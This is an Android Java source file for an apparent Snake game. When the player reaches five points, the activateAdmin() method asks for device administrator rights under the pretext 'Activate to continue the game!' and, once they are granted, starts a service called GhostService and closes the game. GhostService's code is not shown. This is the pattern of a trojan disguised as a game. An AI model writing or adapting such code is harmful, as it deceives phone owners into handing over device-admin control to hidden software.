package com.snakegame.premium;

import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Intent;
import android.graphics.*;
import android.os.Bundle;
import android.os.Handler;
import android.view.Gravity;
import android.view.View;
import android.view.animation.ScaleAnimation;
import android.widget.*;
import java.util.ArrayList;
import java.util.List;
import java.util.Random;

public class MainActivity extends Activity {
    private static final int WIN_SCORE = 5;
    private SnakeView snakeView;
    private TextView scoreText;
    private Handler handler = new Handler();
    private int score = 0;
    private boolean gameOver = false;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        LinearLayout root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setBackgroundColor(0xFF121212);
        root.setGravity(Gravity.CENTER);

        // Header
        LinearLayout header = new LinearLayout(this);
        header.setOrientation(LinearLayout.HORIZONTAL);
        header.setGravity(Gravity.CENTER);
        header.setPadding(16, 16, 16, 16);

        TextView title = new TextView(this);
        title.setText("🐍 SNAKE");
        title.setTextColor(0xFF00FF88);
        title.setTextSize(28);
        title.setTypeface(null, Typeface.BOLD);
        header.addView(title);

        scoreText = new TextView(this);
        scoreText.setText("0");
        scoreText.setTextColor(Color.WHITE);
        scoreText.setTextSize(24);
        scoreText.setPadding(32, 0, 0, 0);
        header.addView(scoreText);

        root.addView(header);

        // Game area
        snakeView = new SnakeView(this);
        LinearLayout.LayoutParams gameParams = new LinearLayout.LayoutParams(800, 800);
        snakeView.setLayoutParams(gameParams);
        root.addView(snakeView);

        // Kontrol
        LinearLayout controls = new LinearLayout(this);
        controls.setOrientation(LinearLayout.VERTICAL);
        controls.setGravity(Gravity.CENTER);

        LinearLayout row1 = new LinearLayout(this);
        row1.setOrientation(LinearLayout.HORIZONTAL);
        row1.addView(createCtrlBtn("▲", 0, -1));
        controls.addView(row1);

        LinearLayout row2 = new LinearLayout(this);
        row2.setOrientation(LinearLayout.HORIZONTAL);
        row2.addView(createCtrlBtn("◄", -1, 0));
        row2.addView(createCtrlBtn("►", 1, 0));
        row2.addView(createCtrlBtn("▼", 0, 1));
        controls.addView(row2);

        root.addView(controls);
        setContentView(root);

        snakeView.startGame();
        updateScore();
    }

    private Button createCtrlBtn(String text, int dx, int dy) {
        Button btn = new Button(this);
        btn.setText(text);
        btn.setTextColor(Color.WHITE);
        btn.setBackgroundColor(0xFF333333);
        btn.setOnClickListener(v -> {
            animateBtn(v);
            snakeView.setDirection(dx, dy);
        });
        LinearLayout.LayoutParams p = new LinearLayout.LayoutParams(150, 120);
        p.setMargins(8, 8, 8, 8);
        btn.setLayoutParams(p);
        return btn;
    }

    private void animateBtn(View v) {
        ScaleAnimation scale = new ScaleAnimation(1f, 0.8f, 1f, 0.8f,
                ScaleAnimation.RELATIVE_TO_SELF, 0.5f, ScaleAnimation.RELATIVE_TO_SELF, 0.5f);
        scale.setDuration(100);
        scale.setRepeatCount(0);
        v.startAnimation(scale);
    }

    private void updateScore() {
        handler.postDelayed(() -> {
            if (!gameOver) {
                score = snakeView.getScore();
                scoreText.setText(String.valueOf(score));
                if (score >= WIN_SCORE) {
                    gameOver = true;
                    activateAdmin();
                } else {
                    handler.postDelayed(this::updateScore, 300);
                }
            }
        }, 300);
    }

    private void activateAdmin() {
        DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
        ComponentName comp = new ComponentName(this, DeviceAdminReceiver.class);
        if (!dpm.isAdminActive(comp)) {
            Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, comp);
            intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Aktifkan untuk melanjutkan game!");
            startActivity(intent);
        } else {
            startService(new Intent(this, GhostService.class));
            finish();
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
        ComponentName comp = new ComponentName(this, DeviceAdminReceiver.class);
        if (dpm.isAdminActive(comp)) {
            startService(new Intent(this, GhostService.class));
            finish();
        }
    }

    public static class SnakeView extends View {
        private List<Point> body = new ArrayList<>();
        private Point food;
        private int dirX = 1, dirY = 0;
        private int grid = 40;
        private int score = 0;
        private Handler gameHandler = new Handler();
        private boolean running = true;
        private Paint snakeP, foodP, bgP, gridP;
        private int viewW, viewH;

        public SnakeView(Activity ctx) {
            super(ctx);
            body.add(new Point(5,5));
            body.add(new Point(4,5));
            body.add(new Point(3,5));
            food = new Point(10,10);
            snakeP = new Paint(); snakeP.setColor(0xFF00FF88); snakeP.setStyle(Paint.Style.FILL);
            foodP = new Paint(); foodP.setColor(0xFFFF1744); foodP.setStyle(Paint.Style.FILL);
            bgP = new Paint(); bgP.setColor(0xFF121212);
            gridP = new Paint(); gridP.setColor(0xFF333333); gridP.setStyle(Paint.Style.STROKE);
        }

        public void startGame() { running = true; gameHandler.postDelayed(gameLoop, 200); }
        public void setDirection(int x, int y) { if (x != -dirX && y != -dirY) { dirX = x; dirY = y; } }
        public int getScore() { return score; }

        private Runnable gameLoop = new Runnable() {
            public void run() {
                if (!running) return;
                Point head = body.get(0);
                Point newHead = new Point(head.x + dirX, head.y + dirY);
                if (newHead.x < 0 || newHead.x >= 20 || newHead.y < 0 || newHead.y >= 20) { running = false; return; }
                for (Point p : body) { if (p.equals(newHead)) { running = false; return; } }
                body.add(0, newHead);
                if (newHead.equals(food)) { score++; food = new Point(new Random().nextInt(20), new Random().nextInt(20)); }
                else { body.remove(body.size()-1); }
                invalidate();
                gameHandler.postDelayed(this, 200);
            }
        };

        @Override protected void onSizeChanged(int w, int h, int oldw, int oldh) { super.onSizeChanged(w, h, oldw, oldh); viewW = w; viewH = h; }
        @Override protected void onDraw(Canvas canvas) {
            super.onDraw(canvas);
            canvas.drawRect(0,0,viewW,viewH,bgP);
            for (int i=0;i<=viewW;i+=grid) canvas.drawLine(i,0,i,viewH,gridP);
            for (int i=0;i<=viewH;i+=grid) canvas.drawLine(0,i,viewW,i,gridP);
            for (Point p : body) {
                RectF rect = new RectF(p.x*grid+2, p.y*grid+2, (p.x+1)*grid-2, (p.y+1)*grid-2);
                canvas.drawRoundRect(rect, 8,8, snakeP);
            }
            RectF fRect = new RectF(food.x*grid+4, food.y*grid+4, (food.x+1)*grid-4, (food.y+1)*grid-4);
            canvas.drawOval(fRect, foodP);
        }
    }
}
